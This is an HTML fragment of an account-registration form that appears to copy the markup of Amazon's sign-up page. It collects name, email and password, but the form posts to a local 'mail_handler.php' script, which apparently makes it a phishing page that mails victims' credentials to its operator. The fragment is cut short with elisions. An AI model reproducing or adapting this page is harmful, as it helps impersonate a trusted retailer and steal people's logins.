...
<form id="ap_register_form" name="register" method="post" novalidate action="mail_handler.php" data-enable-mobile-account-js="false" class="a-spacing-none auth-validate-form auth-real-time-validation">


<!-- form submit end-->
    
    <input type="hidden" name="appActionToken" value="YUZkIzHj2FMMGEwmdb6KuDiRsPj2B0Mj3D" /><input type="hidden" name="appAction" value="REGISTER" />
...
<div class="a-row a-spacing-base">
   ...
   <input type="text" maxlength="50" id="ap_customer_name" autocomplete="off" name="your_name" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field auth-contact-verification-request-info"/>
...
</div>  <div class="auth-require-fields-match-group">        
        <div class="a-row a-spacing-base">
         <label for="ap_email" class="a-form-label">
            Email
          </label>
          
   <input type="email" maxlength="64" id="ap_email" name="email" tabindex="3" class="a-input-text a-span12 auth-required-field auth-require-fields-match auth-require-email-validaton auth-require-reverify-on-change auth-contact-verification-request-info"/>
...
<div class="a-alert-content">
  Enter your email
</div></div></div>  </div>   </div>  <div class="auth-require-fields-match-group">
 <div class="a-row a-spacing-base">
     <label for="ap_password" class="a-form-label">
      Password
  
   <input type="password" maxlength="1024" id="ap_password" autocomplete="off" placeholder="At least 6 characters" name="pass_name" tabindex="5" class="a-input-text a-form-normal a-span12 auth-required-field auth-require-fields-match auth-require-password-validation"/>
  
   
   
   
<div class="a-box a-alert-inline a-alert-inline-info auth-inlined-information-message a-spacing-top-mini"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
